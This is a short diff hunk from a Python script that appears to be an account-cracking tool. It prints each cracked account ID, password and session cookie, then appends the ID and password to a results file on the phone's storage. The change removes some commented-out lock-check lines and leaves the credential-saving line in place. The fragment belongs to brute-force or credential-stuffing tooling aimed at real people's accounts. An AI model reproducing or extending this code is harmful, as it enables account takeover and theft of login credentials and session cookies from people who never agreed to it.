@@ -288,13 +288,7 @@ def b(uid,pwx,tl):
                 print(f'\r\33[1;92m [ASRAF-💚] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\033[1;92m=[💙]=COOKIE : '+coki)
                 oks.append(cid)
-                open('/sdcard/ASRAF-OK💥.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
-            try:
-            	uid=reqs['uid']
-           # except 
-               #  uid=ids
-             #ckkx=lock_check(uid)
-            # if ckkx =='LOCK':	
+                open('/sdcard/ASRAF-OK💥.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')	
                 break
             else:
                 continue
